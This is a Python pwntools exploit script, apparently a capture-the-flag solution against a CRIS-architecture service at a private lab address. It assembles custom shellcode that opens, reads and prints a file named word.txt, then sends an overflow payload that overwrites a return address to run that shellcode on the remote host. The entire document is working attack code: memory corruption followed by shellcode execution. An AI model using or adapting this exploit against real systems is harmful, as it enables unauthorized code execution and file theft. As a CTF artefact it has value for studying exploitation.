from pwn import *

context.arch = "cris"
context.log_level = "DEBUG"


shellcode = '''
/*open word.txt*/
move.d 0x1af8, $r10
move.d 0 , $r11
moveq 0, $r12
moveq 5, $r9
break 13

/*read ( 0 = word.txt , 'sp' , 0x100 )*/
moveq 0, $r10
move.d 0x1800 , $r11
move.d 0x100, $r12
moveq 3, $r9
break 13

push $r10
moveq 1, $r10
move.d 0x1800 , $r11
moveq 30, $r12
moveq 4, $r9
break 13
'''

shellcode = asm(shellcode)

#p = process(["./cris-elf-run","./cris-elf.x"])
p = remote("10.2.3.1","10014")

pay = "word.txt\x00".ljust(0x10,"A")
pay += p32(0x1b00)
pay += shellcode + "B"*8

p.sendlineafter(":",pay)

p.interactive()
